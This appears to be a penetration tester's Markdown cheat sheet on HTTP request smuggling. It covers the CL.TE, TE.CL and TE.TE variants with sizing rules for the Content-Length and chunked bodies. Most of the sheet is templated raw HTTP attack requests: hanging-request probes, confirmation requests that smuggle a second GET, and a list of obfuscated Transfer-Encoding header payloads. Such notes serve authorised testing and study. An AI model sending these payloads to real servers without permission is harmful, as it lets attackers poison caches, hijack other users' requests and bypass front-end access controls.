# HTTP Smuggling
**Content-Length (body) is DECIMAL Bytes**
**Chunk size is HEX Bytes**

**Note: Always append two lines (`\r\n\r\n`) after Null chunk**
**Note: Each line (`\r\n`) is 2 bytes long**
## Headers
```
Transfer-Encoding: chunked
Connection: Keep-Alive
```
## CL.TE
**Client sends Incomplete chunks**
**Nicer to test this first**
```
POST / HTTP/1.1  
Host: vulnerable-website.com  
Transfer-Encoding: chunked  
Content-Length: 4  
  
1
A
[<SMUGGLE>]
```
- Incomplete chunk is sent - Server hangs expecting Zero Chunk

### Confirmation
```
POST /search HTTP/1.1  
Host: <HOST>
Content-Length: 49  
Transfer-Encoding: chunked  
  
<HEX LEN BODY>
<BODY>
0
  
GET /404 HTTP/1.1  
Foo: x
```

## TE.CL
**Client sends larger Content-Length than chunk**
```
POST / HTTP/1.1  
Host: <HOST>
Transfer-Encoding: chunked  
Content-Length: 6
  
0

[<SMUGGLE>]
```
-Zero chunk (3 bytes) is sent - Server hangs expecting 3 more bytes

### Confirmation
```POST /search HTTP/1.1  
Host: <HOST>
Content-Type: application/x-www-form-urlencoded
Content-Length: <2 + LENGTH HEX>
Transfer-Encoding: chunked

<HEX LENGTH OF BODY>
GET /404 HTTP/1.1
Host: <HOST>
Content-Type: application/x-www-form-urlencoded
Content-Length: <11 + LEN ENTIRE NEXT REQUEST>

x=
0


```

## TE.TE
**Obfuscating T.E Header hangs Client / Server**
**Try with above payloads to determine CL.TE or TE.CL**
### Obfuscating Payloads
- `Transfer-Encoding: xchunked`
- `Transfer-Encoding : chunked`
- `Transfer-Encoding: chunked`
- `Transfer-Encoding: x`
- `Transfer-Encoding:[tab]chunked`
- `[space]Transfer-Encoding: chunked`
- `X: X[\n]Transfer-Encoding: chunked`
- `Transfer-Encoding
	: chunked`


